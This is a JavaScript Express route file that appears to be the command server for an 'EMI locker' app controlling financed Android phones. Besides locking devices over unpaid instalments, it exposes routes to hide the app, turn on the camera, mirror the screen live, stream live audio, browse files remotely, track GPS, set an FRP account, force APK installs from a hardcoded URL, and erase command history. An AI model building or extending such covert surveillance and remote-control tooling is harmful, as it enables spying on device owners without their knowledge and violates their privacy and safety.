import { Op } from 'sequelize';
import { CommandService } from '../services/commandService.js';
import { DeviceService } from '../services/deviceService.js';
import { DeviceCommand } from '../models/index.js';
import { serializeCommand } from '../utils/serializers.js';
import { httpError } from '../middleware/auth.js';
import { toEnumName } from '../utils/enums.js';
import { ah } from './auth.js';

const APK_DOWNLOAD_URL = 'https://riadrayhan111-rr-locker-api.hf.space/api/v1/app/download';

async function getDeviceOr404(deviceId) {
  const device = await DeviceService.getDeviceById(deviceId);
  if (!device) throw httpError(404, 'Device not found');
  return device;
}

export default function registerCommandRoutes(router) {
  router.post('/commands/lock', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    const command = await CommandService.createLockCommand(
      device, null, d.reason ?? null, d.message ?? 'Your device has been locked due to pending EMI payment.', d.contact_number || '',
    );
    device.status = 'locked';
    await device.save();
    res.json(serializeCommand(command));
  }));

  router.post('/commands/unlock', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    const command = await CommandService.createUnlockCommand(device, null, d.reason ?? null);
    device.status = 'active';
    await device.save();
    res.json(serializeCommand(command));
  }));

  router.post('/commands/warning', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    const command = await CommandService.createWarningCommand(
      device, d.title, d.message, d.due_date || '', d.amount || '', null,
    );
    res.json(serializeCommand(command));
  }));

  router.post('/commands/hide-app', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createHideAppCommand(device, null, d.reason ?? null)));
  }));

  router.post('/commands/unhide-app', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createUnhideAppCommand(device, null, d.reason ?? null)));
  }));

  router.post('/commands/disable-app', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createDisableAppCommand(device, null, d.reason ?? null)));
  }));

  router.post('/commands/enable-app', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createEnableAppCommand(device, null, d.reason ?? null)));
  }));

  router.post('/commands/gps-track', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createGpsTrackCommand(device, null, d.reason ?? null)));
  }));

  router.post('/commands/camera-on', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    const command = await CommandService.createCameraOnCommand(device, null, d.reason ?? null, d.camera || 'front');
    device.camera_active = true;
    await device.save();
    res.json(serializeCommand(command));
  }));

  router.post('/commands/camera-off', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    const command = await CommandService.createCameraOffCommand(device, null, d.reason ?? null);
    device.camera_active = false;
    await device.save();
    res.json(serializeCommand(command));
  }));

  router.post('/commands/uninstall-app', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    const command = await CommandService.createUninstallAppCommand(device, null, d.reason ?? null);
    device.is_app_disabled = true;
    await device.save();
    res.json(serializeCommand(command));
  }));

  router.post('/commands/set-frp-account', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createSetFrpAccountCommand(device, d.frp_account, null, d.reason ?? null)));
  }));

  router.post('/commands/send-message', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    const command = await CommandService.createCommand(device, 'show_message', { message: d.message }, null, d.reason ?? null);
    res.json(serializeCommand(command));
  }));

  router.post('/commands/bulk', ah(async (req, res) => {
    const d = req.body || {};
    const commands = [];
    for (const deviceId of d.device_ids || []) {
      const device = await DeviceService.getDeviceById(deviceId);
      if (device) {
        commands.push(await CommandService.createCommand(device, String(d.command_type).toLowerCase(), d.payload || {}, null, d.reason ?? null));
      }
    }
    res.json(commands.map(serializeCommand));
  }));

  // Command history for a device.
  router.get('/commands/:deviceId', ah(async (req, res) => {
    let limit = parseInt(req.query.limit, 10);
    limit = Number.isNaN(limit) ? 50 : Math.min(100, Math.max(1, limit));
    const commands = await DeviceCommand.findAll({
      where: { device_id: req.params.deviceId },
      order: [['created_at', 'DESC']],
      limit,
    });
    res.json(commands.map(serializeCommand));
  }));

  router.post('/commands/ack', ah(async (req, res) => {
    const d = req.body || {};
    const command = await CommandService.acknowledgeCommand(
      d.command_id, String(d.status).toLowerCase(), d.error_message ?? null,
    );
    if (!command) throw httpError(404, 'Command not found');
    res.json({ status: 'acknowledged' });
  }));

  // Pending/sent commands for the Android app to pick up.
  router.get('/commands/pending/:deviceId', ah(async (req, res) => {
    const commands = await DeviceCommand.findAll({
      where: {
        device_id: req.params.deviceId,
        status: { [Op.in]: [toEnumName('pending'), toEnumName('sent')] },
      },
      order: [['created_at', 'ASC']],
    });
    res.json(commands.map(serializeCommand));
  }));

  router.delete('/commands/history/:deviceId', ah(async (req, res) => {
    const device = await DeviceService.getDeviceById(req.params.deviceId);
    if (!device) throw httpError(404, 'Device not found');
    await DeviceCommand.destroy({ where: { device_id: req.params.deviceId } });
    res.status(204).end();
  }));

  router.delete('/commands/single/:commandId', ah(async (req, res) => {
    const command = await DeviceCommand.findByPk(req.params.commandId);
    if (!command) throw httpError(404, 'Command not found');
    await command.destroy();
    res.status(204).end();
  }));

  router.post('/commands/update-app', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    const payload = { apk_url: APK_DOWNLOAD_URL, force: String(!!d.force).toLowerCase() };
    if (d.target_version) payload.target_version = String(d.target_version);
    const command = await CommandService.createCommand(device, 'update_app', payload, null, d.reason || 'OTA app update');
    res.json(serializeCommand(command));
  }));

  router.post('/commands/update-app/bulk', ah(async (req, res) => {
    const d = req.body || {};
    const payload = { apk_url: APK_DOWNLOAD_URL, force: String(!!d.force).toLowerCase() };
    if (d.target_version) payload.target_version = String(d.target_version);
    const commands = [];
    for (const deviceId of d.device_ids || []) {
      const device = await DeviceService.getDeviceById(deviceId);
      if (device) commands.push(await CommandService.createCommand(device, 'update_app', payload, null, d.reason || 'OTA app update (bulk)'));
    }
    res.json(commands.map(serializeCommand));
  }));

  // ── Live screen mirror ──
  router.post('/commands/screen-mirror/start', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createStartScreenMirrorCommand(
      device, d.quality || 50, d.fps || 4, d.scale || 0.5, null, d.reason ?? null,
    )));
  }));

  router.post('/commands/screen-mirror/stop', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createStopScreenMirrorCommand(device, null, d.reason ?? null)));
  }));

  // ── Live audio stream ──
  router.post('/commands/audio-stream/start', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    const payload = {
      action: 'start_audio_stream', sample_rate: '16000', channels: '1', capture_playback: 'true',
    };
    res.json(serializeCommand(await CommandService.createCommand(device, 'start_audio_stream', payload, null, d.reason || 'Admin started live audio')));
  }));

  router.post('/commands/audio-stream/stop', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createCommand(device, 'stop_audio_stream', { action: 'stop_audio_stream' }, null, d.reason || 'Admin stopped live audio')));
  }));

  // ── Remote file manager ──
  router.post('/commands/file-manager/start', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createStartFileManagerCommand(device, null, d.reason ?? null)));
  }));

  router.post('/commands/file-manager/stop', ah(async (req, res) => {
    const d = req.body || {};
    const device = await getDeviceOr404(d.device_id);
    res.json(serializeCommand(await CommandService.createStopFileManagerCommand(device, null, d.reason ?? null)));
  }));
}
